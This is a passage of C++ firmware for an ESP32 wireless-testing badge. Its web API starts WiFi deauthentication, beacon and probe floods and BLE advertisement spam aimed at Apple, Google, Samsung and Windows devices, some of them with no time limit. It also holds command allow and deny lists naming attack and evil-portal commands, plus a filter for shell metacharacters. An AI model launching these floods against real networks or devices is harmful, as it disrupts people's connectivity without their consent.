// so they require operator consent via the USB CLI instead
static const char* kMgmtRisky[] = {
  "attack", "sniffpmkid", "sniffbeacon", "sniffprobe", "sniffpwn",
  "sniffesp", "sniffdeauth", "scanall"
};
// Explicitly refused base commands (GPIO pin scans / destructive / portal)
static const char* kMgmtRefused[] = {
  "update", "flash", "erase", "evilportal", "sethtml", "setap"
};

static bool mgmtBaseIn(const char** table, size_t count, const String& base) {
  for (size_t i = 0; i < count; i++)
    if (base == table[i]) return true;
  return false;
}

// Reject shell-style metacharacters; the CLI parser has no escaping
static bool mgmtInputClean(const String& cmd) {
  for (size_t i = 0; i < cmd.length(); i++) {
    char c = cmd[i];
    if (c == ';' || c == '|' || c == '>' || c == '<' || c == '\n' || c == '\r')
      return false;
  }
  return cmd.indexOf("&&") < 0;
}

static String mgmtJsonEscape(const String& in) {
  String out = "";
  for (size_t i = 0; i < in.length(); i++) {
    char c = in[i];
    if (c == '"')       out += "\\\"";
    else if (c == '\\') out += "\\\\";
    else if (c == '\n') out += "\\n";
    else if (c == '\r') out += "\\r";
    else if (c >= 0x20) out += c;
  }
  return out;
}

static void mgmtSendErr(const char* code, const String& msg) {
  server.send(200, "application/json; charset=utf-8",
    "{\"ok\":false,\"code\":\"" + String(code) + "\",\"output\":\"" + mgmtJsonEscape(msg) + "\"}");
}

// ── PASSIVE MONITORS (static storage + callback) ──────────────
EvilPortal::deauth_event_t EvilPortal::deauth_list[MAX_DEAUTH_EVENTS];
uint8_t EvilPortal::deauth_count = 0;
bool EvilPortal::deauth_monitor_active = false;

EvilPortal::probe_event_t EvilPortal::probe_list[MAX_PROBE_EVENTS];
uint8_t EvilPortal::probe_count = 0;
bool EvilPortal::probe_monitor_active = false;

uint8_t EvilPortal::sig_track_bssid[6] = {0};
bool EvilPortal::sig_track_active = false;
int8_t EvilPortal::sig_track_rssi = -100;
uint32_t EvilPortal::sig_track_last_ms = 0;

void IRAM_ATTR EvilPortal::monitorSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 24) return;

  uint8_t subtype = p[0] >> 4;
  uint8_t frame_type = p[0] & 0x0C;

  // Deauth detector: frame type 0x0C (management), subtype 0xC0 or 0xA0
  if (deauth_monitor_active && (p[0] == 0xC0 || p[0] == 0xA0)) {
    const uint8_t* bssid = &p[16]; // addr3 = BSSID
    int idx = -1;
    for (int i = 0; i < deauth_count; i++) {
      if (memcmp(deauth_list[i].bssid, bssid, 6) == 0) { idx = i; break; }
    }
    if (idx < 0 && deauth_count < MAX_DEAUTH_EVENTS) {
      idx = deauth_count++;
      memcpy(deauth_list[idx].bssid, bssid, 6);
      deauth_list[idx].ssid[0] = '\0';
      deauth_list[idx].count = 0;
      deauth_list[idx].rssi = pkt->rx_ctrl.rssi;
    }
    if (idx >= 0) {
      deauth_list[idx].count++;
      deauth_list[idx].last_ms = millis();
      deauth_list[idx].rssi = pkt->rx_ctrl.rssi;
    }
  }

  // Probe request logger: subtype 0x40
  if (probe_monitor_active && p[0] == 0x40 && len > 26) {
    const uint8_t* src = &p[10]; // addr2 = source MAC
    uint8_t ssid_len = p[25];
    if (ssid_len > 0 && ssid_len < 33 && len > 26 + (int)ssid_len) {
      // Find or add
      int idx = -1;
      for (int i = 0; i < probe_count; i++) {
        if (memcmp(probe_list[i].mac, src, 6) == 0 &&
            strncmp(probe_list[i].ssid, (char*)&p[26], ssid_len) == 0) {
          idx = i; break;
        }
      }
      if (idx < 0 && probe_count < MAX_PROBE_EVENTS) {
        idx = probe_count++;
        memcpy(probe_list[idx].mac, src, 6);
        memcpy(probe_list[idx].ssid, &p[26], ssid_len);
        probe_list[idx].ssid[ssid_len] = '\0';
      }
      if (idx >= 0) {
        probe_list[idx].rssi = pkt->rx_ctrl.rssi;
        probe_list[idx].last_ms = millis();
      }
    }
  }

  // Signal tracker: beacon frames from tracked BSSID
  if (sig_track_active && p[0] == 0x80) {
    if (memcmp(&p[10], sig_track_bssid, 6) == 0) {
      sig_track_rssi = pkt->rx_ctrl.rssi;
      sig_track_last_ms = millis();
    }
  }
}

// ── SSID persistence helpers ──────────────────────────────────
static void mgmtSaveSSIDs(LinkedList<ssid>* ssids) {
  File f = SPIFFS.open("/ssids.txt", "w");
  if (!f) return;
  for (int i = 0; i < ssids->size(); i++) {
    f.println(ssids->get(i).essid);
  }
  f.close();
}

static void mgmtLoadSSIDs(LinkedList<ssid>* ssids, WiFiScan& ws) {
  if (!SPIFFS.exists("/ssids.txt")) return;
  File f = SPIFFS.open("/ssids.txt", "r");
  if (!f) return;
  while (f.available()) {
    String line = f.readStringUntil('\n');
    line.trim();
    if (line.length() > 0 && line.length() <= 32) {
      ws.addSSID(line);
    }
  }
  f.close();
  Serial.println("[MGMT] Loaded " + String(ssids->size()) + " SSIDs from SPIFFS");
}

void EvilPortal::setupManagementServer() {
  // Restore management portal if evil twin overwrote it
  if (SPIFFS.exists("/portal_mgmt.html")) {
    SPIFFS.remove("/portal.html");
    SPIFFS.rename("/portal_mgmt.html", "/portal.html");
    Serial.println("[MGMT] Management portal restored from backup");
  }
  // Restore the gzip twin too. mgmtServeFile() prefers it for every client that
  // accepts gzip, so leaving it absent would serve the much larger plain file on
  // every panel load, and leaving a stale one would serve the evil page back to
  // the operator. Restored independently of the plain file so a reset at any
  // point during the attack still converges to a working panel.
  if (SPIFFS.exists("/portal_mgmt.html.gz")) {
    SPIFFS.remove("/portal.html.gz");
    SPIFFS.rename("/portal_mgmt.html.gz", "/portal.html.gz");
    Serial.println("[MGMT] Management portal (gzip) restored from backup");
  }

  // Load persisted SSIDs from SPIFFS
  mgmtLoadSSIDs(ssids, wifi_scan_obj);

  auto servePortal = [this]() {
    mgmtServeFile("/portal.html", "text/html; charset=utf-8");
  };

  // Serve the existing operator UI directly at both roots (no redirect)
  server.on("/", HTTP_GET, servePortal);
  server.on("/portal.html", HTTP_GET, servePortal);

  // Serve app.js separately — split from portal.html so each file
  // is small enough for streamFile with tight heap
  server.on("/app.js", HTTP_GET, [this]() {
    mgmtServeFile("/app.js", "application/javascript; charset=utf-8");
  });

  // Serve service worker for Leaflet tile cache (must be served from / scope)
  server.on("/sw-tiles.js", HTTP_GET, [this]() {
    mgmtServeFile("/sw-tiles.js", "application/javascript; charset=utf-8");
  });

  // ── iOS / Android captive portal probes ────────────────────────────────
  // For the MANAGEMENT AP we want iOS/Android to believe the network has
  // internet so they stay connected. The user opens Safari manually to
  // 192.168.4.1. If we return anything other than the exact "Success"
  // response, iOS opens its restricted websheet and may disconnect.
  server.on("/hotspot-detect.html", HTTP_GET, [this]() {
    server.send(200, "text/html",
      "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
  });
  server.on("/library/test/success.html", HTTP_GET, [this]() {
    server.send(200, "text/html",
      "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
  });
  server.on("/generate_204", HTTP_GET, [this]() {
    server.send(204); // Android: 204 = internet ok
  });
  server.on("/connecttest.txt", HTTP_GET, [this]() {
    server.send(200, "text/plain", "Microsoft Connect Test");
  });
  server.on("/ncsi.txt", HTTP_GET, [this]() {
    server.send(200, "text/plain", "Microsoft NCSI");
  });

  // ── API: POST /api/cmd (whitelist only) ────────────────────
  server.on("/api/cmd", HTTP_POST, [this]() {
    // Same-origin only: no CORS headers are sent at all.
    // E: Bug E — parse JSON body properly; server.arg("plain") was the whole JSON string
    String cmd = "";
    if (server.hasArg("cmd")) {
      cmd = server.arg("cmd");
    } else {
      // Try ArduinoJson parse of body for {"cmd":"..."} 
      cmd = mgmtBodyStr("cmd");
    }
    cmd.trim();

    if (cmd.length() == 0) {
      server.send(400, "application/json; charset=utf-8", "{\"ok\":false,\"output\":\"empty command\"}");
      return;
    }
    if (!mgmtInputClean(cmd)) {
      mgmtSendErr("blocked_metachar", "input contains forbidden character");
      return;
    }

    String base = cmd;
    String rest = "";
    int sp = cmd.indexOf(' ');
    if (sp > 0) { base = cmd.substring(0, sp); rest = cmd.substring(sp + 1); rest.trim(); }

    if (base == "reboot") {
      // I: check confirm in JSON body too
      bool confirmed = (server.hasArg("confirm") && server.arg("confirm") == "CONFIRM_REBOOT") ||
                       mgmtBodyStr("confirm") == "CONFIRM_REBOOT";
      if (!confirmed) {
        mgmtSendErr("confirm_required", "reboot requires confirm=CONFIRM_REBOOT");
        return;
      }
      server.send(200, "application/json; charset=utf-8", "{\"ok\":true,\"output\":\"Rebooting...\"}");
      delay(200);
      ESP.restart();
      return;
    }

    // I: help command — return whitelist as compact JSON
    if (base == "help") {
      String j = "{\"ok\":true,\"whitelist\":[";
      for (size_t i = 0; i < sizeof(kMgmtAllowed)/sizeof(kMgmtAllowed[0]); i++) {
        if (i) j += ",";
        j += "\""; j += kMgmtAllowed[i]; j += "\"";
      }
      j += "],\"usage\":\"POST /api/cmd {\\\"cmd\\\":\\\"<command> [args]\\\"}\"}";
      server.send(200, "application/json; charset=utf-8", j);
      return;
    }

    // Risky WiFi commands: refuse without executing (connection may be lost)
    if (base.startsWith("attack") ||
        mgmtBaseIn(kMgmtRisky, sizeof(kMgmtRisky) / sizeof(kMgmtRisky[0]), base)) {
      mgmtSendErr("management_ap_interrupt",
        "requires operator consent because control connection may be lost; use USB CLI");
      return;
    }

    // Explicitly refused commands and flash/erase variants
    if (base.startsWith("flash") || base.startsWith("erase") ||
        mgmtBaseIn(kMgmtRefused, sizeof(kMgmtRefused) / sizeof(kMgmtRefused[0]), base)) {
      mgmtSendErr("command_refused", "command not allowed from management AP");
      return;
    }

    // Subcommand restrictions inside allowed bases
    if (base == "nfc" && rest == "scan") {
      mgmtSendErr("command_refused", "nfc scan toggles GPIO pins; use USB CLI");
      return;
    }
    if (base == "spiffs" && (rest.startsWith("rm") || rest.startsWith("format"))) {
      mgmtSendErr("command_refused", "spiffs rm/format not allowed from management AP");
      return;
    }

    if (!mgmtBaseIn(kMgmtAllowed, sizeof(kMgmtAllowed) / sizeof(kMgmtAllowed[0]), base)) {
      mgmtSendErr("not_whitelisted", "base command not in management whitelist");
      return;
    }

    Serial.println("[MGMT] cmd: " + cmd);
    SerialMirror::logDrain(); // clear stale
    cli_obj.runCommand(cmd);
    delay(80);                // let async operations write initial output
    String out = SerialMirror::logDrain();
    server.send(200, "application/json; charset=utf-8", "{\"ok\":true,\"output\":\"" + mgmtJsonEscape(out) + "\"}");
  });

  // ── API: GET /api/poll (drain mirrored serial log) ─────────
  server.on("/api/poll", HTTP_GET, [this]() {
    String lines = SerialMirror::logDrain();
    if (lines.length() == 0) {
      server.send(200, "application/json; charset=utf-8", "{\"lines\":[]}");
      return;
    }
    String json = "{\"lines\":[";
    bool first = true;
    int start = 0;
    for (int i = 0; i <= (int)lines.length(); i++) {
      if (i == (int)lines.length() || lines[i] == '\n') {
        String line = lines.substring(start, i);
        if (line.length() > 0) {
          if (!first) json += ",";
          json += "\"" + mgmtJsonEscape(line) + "\"";
          first = false;
        }
        start = i + 1;
      }
    }
    json += "]}";
    server.send(200, "application/json; charset=utf-8", json);
  });

  // ── API: GET /api/state (badge + job state machine status) ──
  server.on("/api/state", HTTP_GET, [this]() {
    server.send(200, "application/json; charset=utf-8", this->mgmtStateJson());
  });
  server.on("/api/scan/state", HTTP_GET, [this]() {
    server.send(200, "application/json; charset=utf-8", this->mgmtStateJson());
  });

  // ── API: POST /api/scan {kind:ap|sta, secs:5..30} ───────────
  // ── API: POST /api/scan — direct WiFi.scanNetworks() for reliable
  // multi-channel results. The promiscuous scanap doesn't populate
  // access_points on C5, so we bypass it entirely.
  server.on("/api/scan", HTTP_POST, [this]() {
    if (this->mgmt_job_state != MGMT_JOB_IDLE) {
      server.send(409, "application/json; charset=utf-8",
        "{\"ok\":false,\"code\":\"busy\",\"state\":\"" + this->mgmtJobStateName() + "\"}");
      return;
    }

    int scanDur = (int)mgmtBodyLong("duration", 10);
    if (scanDur < 10)  scanDur = 10;
    if (scanDur > 120) scanDur = 120;

    Serial.printf("[MGMT] web scan: budget %ds, all channels\n", scanDur);
    this->mgmt_job_state = MGMT_JOB_SCANNING;
    this->mgmt_job_kind  = "scan-ap-direct";
    this->mgmt_job_t0    = millis();
    this->mgmt_job_duration_s = (uint32_t)scanDur;
    this->mgmt_scan_retried = false; // allow one auto-retry if the radio returns 0/-2
    this->mgmt_scan_seen_n  = 0;     // reset the cross-cycle dedup table

    // C: Bug C — delete stations/beacon before clearing to prevent ~1.5KB/scan leak
    while (access_points->size() > 0) {
      AccessPoint ap = access_points->get(0);
      if (ap.stations != nullptr) { delete ap.stations; ap.stations = nullptr; }
      if (ap.beacon   != nullptr) { delete ap.beacon;   ap.beacon   = nullptr; }
      access_points->remove(0);
    }

    // C: Bug C — async scan; returns immediately, mgmtServiceJob polls WiFi.scanComplete()
    WiFi.scanNetworks(true /*async*/, true /*show_hidden*/);
    server.send(200, "application/json; charset=utf-8",
      "{\"ok\":true,\"state\":\"scanning\"}");
  });
  // ── API: GET /api/aps (scan results, chunked) ─────────────
  server.on("/api/aps", HTTP_GET, [this]() {
    // H: Bug H — if scan still running, say so
    bool scanning = (this->mgmt_job_state == MGMT_JOB_SCANNING &&
                     this->mgmt_job_kind == "scan-ap-direct");
    server.setContentLength(CONTENT_LENGTH_UNKNOWN);
    server.send(200, "application/json; charset=utf-8", "");
    server.sendContent("{\"ok\":true,\"scanning\":" + String(scanning?"true":"false") +
                       ",\"count\":" + String(access_points->size()) + ",\"aps\":[");
    char buf[256];
    for (int i = 0; i < access_points->size(); i++) {
      AccessPoint ap = access_points->get(i);
      String ess = mgmtJsonEscape(ap.essid);
      // H: derive auth string and open bool from encryptionType
      const char* auth_str = "OPEN";
      bool is_open = true;
      switch (ap.encryptionType) {
        case WIFI_AUTH_WEP:         auth_str = "WEP";     is_open = false; break;
        case WIFI_AUTH_WPA_PSK:     auth_str = "WPA";     is_open = false; break;
        case WIFI_AUTH_WPA2_PSK:    auth_str = "WPA2";    is_open = false; break;
        case WIFI_AUTH_WPA_WPA2_PSK:auth_str = "WPA2";    is_open = false; break;
        case WIFI_AUTH_WPA3_PSK:    auth_str = "WPA3";    is_open = false; break;
        case WIFI_AUTH_WPA2_ENTERPRISE: auth_str = "WPA2-ENT"; is_open = false; break;
        default: auth_str = "OPEN"; is_open = true; break;
      }
      snprintf(buf, sizeof(buf),
               "%s{\"i\":%d,\"ssid\":\"%s\",\"ch\":%d,\"rssi\":%d,\"sel\":%s,"
               "\"auth\":\"%s\",\"open\":%s,\"wpsPresent\":%s,"
               "\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\"}",
               i ? "," : "", i, ess.c_str(), ap.channel, (int)ap.rssi,
               ap.selected ? "true" : "false",
               auth_str, is_open ? "true" : "false",
               ap.wpsPresent ? "true" : "false",
               ap.bssid[0], ap.bssid[1], ap.bssid[2],
               ap.bssid[3], ap.bssid[4], ap.bssid[5]);
      server.sendContent(buf);
    }
    server.sendContent("]}");
    server.sendContent("");
  });

  // ── API: GET /api/stas (station scan results kept in RAM) ────
  server.on("/api/stas", HTTP_GET, [this]() {
    String json = "{\"count\":" + String(stations->size()) + ",\"stas\":[";
    for (int i = 0; i < stations->size(); i++) {
      Station st = stations->get(i);
      char mac[18];
      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
               st.mac[0], st.mac[1], st.mac[2],
               st.mac[3], st.mac[4], st.mac[5]);
      if (i) json += ",";
      json += "{\"i\":" + String(i) +
              ",\"mac\":\"" + String(mac) + "\"" +
              ",\"ch\":" + String(st.channel) +
              ",\"sel\":" + String(st.selected ? "true" : "false") + "}";
    }
    json += "]}";
    server.send(200, "application/json; charset=utf-8", json);
  });

  // ── API: POST /api/select {i, on} ────────────────────────────
  // Direct list write (the CLI "select -a i" toggles, which is not
  // deterministic for an explicit on/off API).
  server.on("/api/select", HTTP_POST, [this]() {
    int i = -1; bool on = false; bool parsed = false;
    if (server.hasArg("i")) {
      i = server.arg("i").toInt();
      on = server.hasArg("on") &&
           (server.arg("on") == "1" || server.arg("on") == "true");
      parsed = true;
    }
    if (!parsed) {
      i  = (int)mgmtBodyLong("i", -1);
      on = mgmtBodyBool("on", false);
    }
    if (i < 0) {
      server.send(400, "application/json; charset=utf-8",
        "{\"ok\":false,\"code\":\"missing_index\",\"output\":\"missing i\"}");
      return;
    }
    if (i < 0 || i >= access_points->size()) {
      server.send(400, "application/json; charset=utf-8",
        "{\"ok\":false,\"code\":\"bad_index\",\"output\":\"index out of range\"}");
      return;
    }
    AccessPoint ap = access_points->get(i);
    ap.selected = on;
    access_points->set(i, ap);
    server.send(200, "application/json; charset=utf-8",
      "{\"ok\":true,\"i\":" + String(i) +
      ",\"sel\":" + String(on ? "true" : "false") + "}");
  });

  // ── API: POST /api/attack {type, duration} ───────────────────
  // Attacks run ONLY through this endpoint (never via /api/cmd).
  // duration 0 = indefinite: the radio leaves the AP channel, so the
  // phone cannot send a stop; only a badge reboot ends it.
  server.on("/api/attack", HTTP_POST, [this]() {
    if (this->mgmt_job_state != MGMT_JOB_IDLE) {
      server.send(409, "application/json; charset=utf-8",
        "{\"ok\":false,\"code\":\"busy\",\"state\":\"" + this->mgmtJobStateName() + "\"}");
      return;
    }
    String type = server.hasArg("type") ? server.arg("type") : "";
    long duration = server.hasArg("duration") ? server.arg("duration").toInt() : -1;
    if (type == "" || duration < 0) {
      if (type == "")    type = mgmtBodyStr("type");
      if (duration < 0)  duration = mgmtBodyLong("duration", 30);
    }
    if (duration != 0 && (duration < 10 || duration > 600)) {
      server.send(400, "application/json; charset=utf-8",
        "{\"ok\":false,\"code\":\"invalid_duration\",\"output\":\"duration must be 0 or 10..600\"}");
      return;
    }

    String cmd;
    bool needs_ap = false;    // requires a selected access point
    bool needs_any = false;   // accepts a selected AP or station
    if (type == "deauth")            { cmd = "attack -t deauth";     needs_any = true; }
    else if (type == "beacon-random")  cmd = "attack -t beacon -r";
    else if (type == "beacon-list")  { cmd = "attack -t beacon -a";  needs_ap  = true; }
    else if (type == "probe")        { cmd = "attack -t probe";      needs_ap  = true; }
    else if (type == "rickroll")       cmd = "attack -t rickroll";
    else {
      server.send(400, "application/json; charset=utf-8",
        "{\"ok\":false,\"code\":\"invalid_type\",\"output\":\"unknown attack type\"}");
      return;
    }

    if (needs_ap || needs_any) {
      bool ap_sel = false, st_sel = false;
      for (int i = 0; i < access_points->size(); i++)
        if (access_points->get(i).selected) { ap_sel = true; break; }
      for (int i = 0; i < stations->size(); i++)
        if (stations->get(i).selected) { st_sel = true; break; }
      if ((needs_ap && !ap_sel) || (needs_any && !ap_sel && !st_sel)) {
        server.send(400, "application/json; charset=utf-8",
          "{\"ok\":false,\"code\":\"no_targets\",\"output\":\"no selected targets; select an AP first\"}");
        return;
      }
    }

    Serial.println("[MGMT] web attack: " + cmd +
                   (duration > 0 ? " for " + String(duration) + "s" : " INDEFINITE"));
    SerialMirror::logDrain();
    cli_obj.runCommand(cmd);
    this->mgmt_job_state      = MGMT_JOB_ATTACK;
    this->mgmt_job_kind       = "attack-" + type;
    this->mgmt_job_t0         = millis();
    this->mgmt_job_duration_s = (uint32_t)duration;
    server.send(200, "application/json; charset=utf-8",
      "{\"ok\":true,\"state\":\"attack\",\"kind\":\"" + mgmtJsonEscape(this->mgmt_job_kind) +
      "\",\"duration\":" + String(duration) + "}");
  });

  // ── API: POST /api/ble {action:scan|spam, kind, duration} ────
  // NOTE: the BLE NimBLE paths themselves never call esp_wifi_set_mode,
  // but StartScan()->initWiFi() puts the radio in WIFI_AP_STA on the C5,
  // so BLE jobs are re-armed afterwards exactly like WiFi jobs.
  server.on("/api/ble", HTTP_POST, [this]() {
    if (this->mgmt_job_state != MGMT_JOB_IDLE) {
      server.send(409, "application/json; charset=utf-8",
        "{\"ok\":false,\"code\":\"busy\",\"state\":\"" + this->mgmtJobStateName() + "\"}");
      return;
    }
    String action = server.hasArg("action") ? server.arg("action") : "";
    long duration = server.hasArg("duration") ? server.arg("duration").toInt() : -1;
    String bk_arg = server.hasArg("kind") ? server.arg("kind") : "";
    if (action == "" || duration < 0 || bk_arg == "") {
      if (action == "")  action = mgmtBodyStr("action");
      if (duration < 0)  duration = mgmtBodyLong("duration", (long)(action == "scan" ? 15 : 30));
      if (bk_arg == "")  bk_arg = mgmtBodyStr("kind");
    }
    if (duration != 0 && (duration < 10 || duration > 600)) {
      server.send(400, "application/json; charset=utf-8",
        "{\"ok\":false,\"code\":\"invalid_duration\",\"output\":\"duration must be 0 or 10..600\"}");
      return;
    }

    String cmd, kind;
    if (action == "scan") {
      cmd = "sniffbt";
      kind = "ble-scan";
    } else if (action == "spam") {
      if (bk_arg == "apple" || bk_arg == "google" || bk_arg == "samsung" ||
          bk_arg == "windows" || bk_arg == "all") {
        cmd  = "blespam -t " + bk_arg;
        kind = "blespam-" + bk_arg;
      } else {
        server.send(400, "application/json; charset=utf-8",
          "{\"ok\":false,\"code\":\"invalid_kind\",\"output\":\"kind must be apple/google/samsung/windows/all\"}");
        return;
      }
    } else {
      server.send(400, "application/json; charset=utf-8",
        "{\"ok\":false,\"code\":\"invalid_action\",\"output\":\"action must be scan or spam\"}");
      return;
    }

    // NimBLE needs a large CONTIGUOUS block that the live WiFi driver + AP
    // sockets + SPIFFS cache keep fragmented, so ensureBLE() fails with the
    // AP up no matter how much total heap is free. Tear the radio stack down
    // first, then init BLE. The job timer in mgmtServiceJob reboots the badge
    // when the duration expires, which is the only reliable way to get the
    // management AP back (NimBLE does not return its heap on deinit).
    bool needTeardown = !wifi_scan_obj.ble_initialized;

    // Answer while the AP is still up — the client must receive this before
    // the radio goes down, otherwise the UI just sees a dead socket.
    server.send(200, "application/json; charset=utf-8",
      "{\"ok\":true,\"state\":\"attack\",\"kind\":\"" + mgmtJsonEscape(kind) +
      "\",\"duration\":" + String(duration) +
      (duration > 0
        ? ",\"note\":\"WiFi se apaga durante BLE. Al terminar los " + String(duration) + "s el badge se reinicia solo y vuelve el panel.\"}"
        : ",\"note\":\"WiFi se apaga durante BLE (modo indefinido). Presiona RESET para volver al panel.\"}"));

    if (needTeardown) {
      Serial.println("[BLE] Tearing down WiFi for BLE init...");
      delay(500); // let the HTTP response flush completely

      // Release every large allocation that fragments the heap
      this->dnsServer.stop();
      server.stop();
      server.close();   // release socket buffers
      SPIFFS.end();     // release the SPIFFS cache

      WiFi.softAPdisconnect(true);
      WiFi.disconnect(true, true);
      WiFi.mode(WIFI_MODE_NULL);
      delay(100);
      esp_wifi_stop();  // stop the radio, keep the driver alive for recovery
      this->management_active = false;
      delay(500);

      Serial.printf("[BLE] Post-teardown largest block: %u bytes, free: %u\n",
                    (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT),
                    (unsigned)ESP.getFreeHeap());
    }

    if (!wifi_scan_obj.ensureBLE()) {
      Serial.printf("[BLE] Init failed, largest=%u\n",
                    (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
      // Bring the panel back so the operator is not locked out
      SPIFFS.begin(true);
      this->rearmManagementAP();
      this->management_active = true;
      server.begin();
      // Restart DNS too: without it iOS/macOS flag the network as broken and
      // auto-disconnect (reason=8 ASSOC_LEAVE), so the panel looks dead even
      // though the AP is back.
      this->dnsServer.start(53, "*", WiFi.softAPIP());
      return;
    }

    Serial.println("[MGMT] web ble: " + cmd +
                   (duration > 0 ? " for " + String(duration) + "s" : " INDEFINITE"));
    SerialMirror::logDrain();
    cli_obj.runCommand(cmd);
    this->mgmt_job_state      = MGMT_JOB_ATTACK;
    this->mgmt_job_kind       = kind;
    this->mgmt_job_t0         = millis();
    this->mgmt_job_duration_s = (uint32_t)duration;
  });

  // ── API: POST /api/stop (stop current job + re-arm AP) ───────
  server.on("/api/stop", HTTP_POST, [this]() {
    if (this->mgmt_job_state == MGMT_JOB_SCANNING ||
        this->mgmt_job_state == MGMT_JOB_ATTACK) {
      Serial.println("[MGMT] web stop requested");
      cli_obj.runCommand("stopscan");
      this->mgmt_job_state = MGMT_JOB_REARM;
      this->mgmt_job_t0    = millis();
      server.send(200, "application/json; charset=utf-8", "{\"ok\":true,\"state\":\"rearm\"}");
      return;
    }
    server.send(200, "application/json; charset=utf-8",
      "{\"ok\":true,\"state\":\"" + this->mgmtJobStateName() + "\"}");
  });

  // ── API: GET /api/gps ────────────────────────────────────────
  server.on("/api/gps", HTTP_GET, [this]() {
    #ifdef HAS_GPS
      if (!gps_obj.getGpsModuleStatus()) {
        server.send(200, "application/json; charset=utf-8",
          "{\"ok\":false,\"code\":\"no_module\",\"output\":\"GPS module not detected\"}");
        return;
      }
      String json = "{\"ok\":true";
      json += ",\"fix\":" + String(gps_obj.getFixStatus() ? "true" : "false");
      json += ",\"fix_text\":\"" + mgmtJsonEscape(gps_obj.getFixStatusAsString()) + "\"";
      json += ",\"sats\":" + String(gps_obj.getNumSats());
      json += ",\"lat\":\"" + mgmtJsonEscape(gps_obj.getLat()) + "\"";
      json += ",\"lon\":\"" + mgmtJsonEscape(gps_obj.getLon()) + "\"";
      json += ",\"alt\":" + String(gps_obj.getAlt(), 1);
      // BUG-07 fix: return 0 when no GPS fix instead of placeholder 63.7
      bool hasFix = gps_obj.getFixStatus();
      json += ",\"accuracy\":" + String(hasFix ? gps_obj.getAccuracy() : 0.0f, 1);
      json += ",\"datetime\":\"" + mgmtJsonEscape(gps_obj.getDatetime()) + "\"";
      json += "}";
      server.send(200, "application/json; charset=utf-8", json);
    #else
      server.send(200, "application/json; charset=utf-8",
        "{\"ok\":false,\"code\":\"no_gps\",\"output\":\"GPS not supported on this build\"}");
    #endif
  });

  // ── API: POST /api/gps — full module re-init ─────────────────
  // GpsInterface::begin() powers GPS_ON_PIN back HIGH, re-probes 9600/115200
  // and re-sets gps_enabled. This is the ONLY recovery path when the boot
  // probe failed: begin() drives the pin LOW and latches gps_enabled=false,
  // so a cold/slow module stays dead until reboot without this route.
  // Deliberately does NOT early-return on !getGpsModuleStatus() — recovering
  // from exactly that state is the point. Blocks ~7.5s worst case (same
  // code path the boot already takes when the module is absent).
  server.on("/api/gps", HTTP_POST, [this]() {
    #ifdef HAS_GPS
      // SAFETY: begin() re-inits the UART, calls disable_queue() and blocks
      // ~7.5s. Doing that under an active wardrive/attack kills the NMEA
      // stream mid-job (and leaves GPS powered OFF if the probe window
      // misses), so the job silently stops producing points. Only allow a
      // re-init when nothing is running.
      if (this->mgmt_job_state != MGMT_JOB_IDLE) {
        server.send(409, "application/json; charset=utf-8",
          "{\"ok\":false,\"code\":\"busy\",\"state\":\"" + this->mgmtJobStateName() +
          "\",\"output\":\"Detén el trabajo en curso antes de reiniciar el GPS\"}");
        return;
      }
      Serial.println("[MGMT] GPS re-init requested");
      gps_obj.begin();
      bool det = gps_obj.getGpsModuleStatus();
      String json = "{\"ok\":";
      json += det ? "true" : "false";
      json += ",\"detected\":";
      json += det ? "true" : "false";
      if (!det) json += ",\"code\":\"no_module\"";
      json += ",\"sats\":" + String(gps_obj.getNumSats());
      json += ",\"fix\":" + String(gps_obj.getFixStatus() ? "true" : "false");
      json += ",\"output\":\"";
      json += det ? "GPS re-inicializado" : "GPS no detectado tras reintento";
      json += "\"}";
      server.send(200, "application/json; charset=utf-8", json);
    #else
      server.send(200, "application/json; charset=utf-8",
        "{\"ok\":false,\"code\":\"no_gps\",\"output\":\"GPS not supported on this build\"}");
    #endif
  });

  // ── API: POST /api/nfc {action:read|write-url|write-text, data}
  // Wraps the existing nfc CLI. Tag operations block until a tag is
  // presented; final output arrives asynchronously on /api/poll.
  // ── API: GET /api/nfc — read UID + current NDEF content ────────
  server.on("/api/nfc", HTTP_GET, [this]() {
#ifdef HAS_NFC
    nfc_obj.begin();
    uint8_t block0[16], block1[16], block2[16];
    String uid = "--", content = "", ctype = "empty";

    if (nfc_obj.read_i2c_block(0x00, block0)) {
      char ub[22];
      snprintf(ub, sizeof(ub), "%02X:%02X:%02X:%02X:%02X:%02X:%02X",
               block0[0], block0[1], block0[2], block0[3],
               block0[4], block0[5], block0[6]);
      uid = String(ub);
    }

    // Read blocks 1-2 for NDEF content preview
    if (nfc_obj.read_i2c_block(0x01, block1) && nfc_obj.read_i2c_block(0x02, block2)) {
      // Combine 32 bytes for parsing
      uint8_t ndef[32];
      memcpy(ndef, block1, 16);
      memcpy(ndef + 16, block2, 16);
      // Check for NDEF TLV: 03 LEN D1 01 ...
      if (ndef[0] == 0x03 && ndef[2] == 0xD1) {
        uint8_t tnf = ndef[4]; // TNF + type length
        if (tnf == 0x55) { // URI
          ctype = "uri";
          // URI prefix codes
          const char* pfx[] = {"","http://www.","https://www.","http://","https://",
                               "tel:","mailto:","ftp://anonymous:anonymous@ftp.",
                               "ftp://ftp.","ftps://","sftp://","smb://","nfs://",
                               "ftp://","dav://","news:","telnet://","imap:",
                               "rtsp://","urn:","pop:","sip:","sips:","tftp:","btspp://",
                               "btl2cap://","btgoep://","tcpobex://","irdaobex://",
                               "file://","urn:epc:id:","urn:epc:tag:","urn:epc:pat:",
                               "urn:epc:raw:","urn:epc:","urn:nfc:"};
          int pidx = ndef[6];
          String prefix = (pidx < 36) ? pfx[pidx] : "";
          // Extract text after prefix byte
          int len = ndef[1] - 5; // payload length
          if (len > 25) len = 25;
          content = prefix;
          for (int i = 0; i < len; i++) {
            char c = (char)ndef[7 + i];
            if (c == 0xFE || c == 0) break;
            content += c;
          }
        } else if (tnf == 0x54) { // Text
          ctype = "text";
          int lang_len = ndef[6] & 0x3F;
          int len = ndef[1] - 5 - lang_len;
          if (len > 25) len = 25;
          for (int i = 0; i < len; i++) {
